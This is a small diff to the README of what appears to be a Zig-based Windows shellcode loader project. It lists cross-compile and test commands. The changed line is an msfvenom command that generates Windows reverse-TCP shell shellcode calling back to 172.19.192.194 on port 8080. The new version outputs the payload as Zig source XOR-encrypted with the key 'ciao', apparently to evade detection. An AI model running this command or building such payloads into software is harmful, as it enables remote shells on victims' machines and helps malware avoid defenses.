@@ -43,4 +43,5 @@ Deps for cross-compiler on linux:  mingw-w64-headers,mingw-w64-gcc
 
 - Compile: `zig build -Dtarget=x86_64-windows -Doptimize=ReleaseSmall --summary all`
 - Test: `zig build test --summary all`
-- Shellcode generatore `msfvenom -p windows/shell_reverse_tcp LHOST=172.19.192.194 LPORT=8080 -f hex`
+- Shellcode generatore `msfvenom -p windows/shell_reverse_tcp LHOST=172.19.192.194 LPORT=8080 -f zig --encrypt xor --encrypt-key ciao
+`
